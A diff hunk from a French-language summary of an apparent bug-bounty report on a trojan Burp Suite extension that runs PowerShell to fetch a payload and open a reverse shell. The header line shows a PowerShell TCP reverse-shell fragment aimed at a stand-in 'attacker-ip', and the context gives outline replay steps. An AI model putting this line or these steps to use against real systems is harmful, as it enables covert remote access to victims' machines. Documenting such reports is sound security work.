@@ -72,9 +72,9 @@ $client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
 **Rejouer / exploiter (dérivé de la source) :**
 - Prérequis : convaincre la cible d'installer l'extension malveillante (modèle « Trojan horse ») ; le PoC complet est une pièce jointe absente du texte (`{F4093216}`).
 - Étapes : 1. créer une extension Burp au comportement visible inoffensif (calculatrice, notepad). 2. Y embarquer l'écriture de `poc.ps1` dans le répertoire de l'extension, exécuté via `powershell.exe -ExecutionPolicy Bypass -File`. 3. Le script PowerShell télécharge et exécute un payload distant, puis ouvre un reverse shell Netcat vers l'attaquant. 4. Faire installer l'extension par la cible et constater l'accès persistant.
-- Pièges / limites : non documenté dans la source pour les canaux de distribution de l'extension ; le rapport a été trié *informative* (comportement attendu du framework selon le programme) ; le PoC complet est une pièce jointe non incluse.
+- Pièges / limites : non documenté dans la source pour les canaux de distribution de l'extension ; le rapport est en sous-état *informative* (`substate: informative`) sans motif de triage explicite dans la source ; le PoC complet est annoncé comme pièce jointe (`{F4093216}`), absente du texte brut.
 
-**Reproductibilité :** moyenne — snippets d'exécution fournis, mais l'attaque exige l'installation volontaire de l'extension par la victime et le PoC complet est une pièce jointe caviardée.
+**Reproductibilité :** moyenne — snippets d'exécution fournis, mais l'attaque exige l'installation volontaire de l'extension par la victime et le PoC complet reste hors texte (pièce jointe non exportée).
 
 **Techniques :** malicious extension, trojan horse, powershell staging, reverse shell, persistence, unsigned extension install
 
